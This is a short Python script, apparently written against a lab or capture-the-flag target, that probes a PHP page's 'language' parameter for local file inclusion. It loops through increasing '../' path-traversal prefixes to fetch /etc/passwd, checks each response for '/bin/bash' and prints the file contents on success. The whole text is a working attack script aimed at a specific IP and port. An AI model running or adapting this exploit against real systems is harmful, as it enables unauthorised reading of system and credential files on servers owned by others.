import requests

url = "http://94.237.63.165:47606/index.php?language="
file = "etc/passwd"
iteration = ""
found = False

for i in range(1, 10):  #adding ../
    iteration += "../"
    payload = iteration + file
    print(payload)

    ourRequest = requests.get(url + payload)
    print(ourRequest)

    if "/bin/bash" in ourRequest.text:
        print ("LFI Found:" + ourRequest.text)
        found = True
        break

if not found:
    print("....LFI attack failed, Could not retrieve /etc/passwd")
